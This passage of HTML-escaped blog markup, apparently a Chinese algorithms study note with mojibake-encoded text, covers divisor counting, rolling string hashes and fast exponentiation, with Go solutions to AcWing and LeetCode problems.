style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸ª&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å› &lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ­¤&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çº¦&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æŸ&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;çš„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ä¸ª&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;æ•°&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ï¼š&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;å› æ­¤nçš„çº¦æŸçš„ä¸ªæ•°ï¼š(a_{0}+1)*(a_{1}+1)*...*(a_{n}+1)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å› &lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ­¤&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çº¦&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æŸ&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ä¸ª&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ï¼š&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;https://www.acwing.com/problem/content/description/872/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func main() {
    var n int
    hash := make(map[int]int)
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)
    
    for i := 0; i &amp;lt; n; i++ {
        var tmp int
        fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;tmp)
        n := tmp
        for j := 2; j &amp;lt;= n / j; j++ {
            for tmp % j == 0 {
                tmp /= j
                hash[j]++
            }
        }
        if tmp &amp;gt; 1 {
            hash[tmp] ++
        }
    }
    var ans int = 1
    for _, v := range hash {
        ans = (ans * (v + 1) ) % (1e9 + 7)
    }
    fmt.Printf(&amp;quot;%d\n&amp;quot;, ans)
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ¨¡è¿ç®—&#34;&gt;æ¨¡è¿ç®—&lt;/h2&gt;
&lt;h3 id=&#34;å­—ç¬¦ä¸²å“ˆå¸Œ&#34;&gt;å­—ç¬¦ä¸²å“ˆå¸Œ&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/find-substring-with-given-hash-value/&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1643609240761.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// åå‘æ»‘åŠ¨çª—å£ï¼Œä¸‹ä¸€ä¸ªçª—å£çš„å‰k-1ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²å“ˆå¸Œ=è¿™ä¸€ä¸ªçª—å£çš„åk-1ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²å“ˆå¸Œå€¼*p
func subStrHash(s string, power int, modulo int, k int, hashValue int) string {
    pk_map := make(map[int]int) // pçš„næ¬¡å¹‚ï¼špk_map[i]: p^i % m
    pk_map[0] = 1 % modulo
    for i := 1; i &amp;lt; k; i++ {
        pk_map[i] = (pk_map[i-1] * power % modulo) % modulo
    }
    ans := 0
    tmp_hv := 0
    i := len(s) - 1
    for ; i &amp;gt;= len(s) - k ; i-- {
        tmp_hv = (tmp_hv * power + int(s[i])-int(&#39;a&#39;)+1)  % modulo
    }
    if tmp_hv == hashValue {
        ans = i + 1
    }
    for ; i &amp;gt;=  0; i-- {
        tmp_hv_k := ((int(s[i+k])-int(&#39;a&#39;) + 1) * pk_map[k-1] ) % modulo
        tmp_hv = (tmp_hv - tmp_hv_k + modulo ) % modulo
        tmp_hv = (tmp_hv * power + (int(s[i])-int(&#39;a&#39;)+1)) % modulo
        if tmp_hv == hashValue {
            ans = i
        }
    }
    return s[ans: ans+k]
}
// (a + b) % p = (a % p + b % p) % p 
// (a * b) % p = (a % p * b % p) % p 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å¿«é€Ÿå¹‚&#34;&gt;å¿«é€Ÿå¹‚&lt;/h3&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/95902286&lt;/p&gt;
&lt;p&gt;æ±‚è§£ä¸€ä¸ªæ•°çš„næ¬¡å¹‚ï¼Œå¦‚æœåªæ˜¯å°†è¯¥æ•°è¿›è¡Œnæ­¤ç›¸ä¹˜ï¼Œåˆ™éœ€è¦è¿›è¡Œnè¯è¿ç®—ï¼Œè€Œä½¿ç”¨å¿«é€Ÿå¹‚åˆ™å¯ä»¥é™ä½åˆ°lognã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚æ±‚&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;20&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^{20}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œé¦–å…ˆæ‹†åˆ†ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/mrow&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^{2*10}=5^{10} * 5^{10}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œåªéœ€è¦æ±‚&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^{10}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;å†ä¹˜ä¸Š2ï¼Œå³ä¸€å…±11æ¬¡è¿ç®—ï¼›åœ¨æ­¤åŸºç¡€ä¸Šå†è¿›è¡Œæ‹†åˆ†ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;5^5*5^5*5^5*5^5&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; 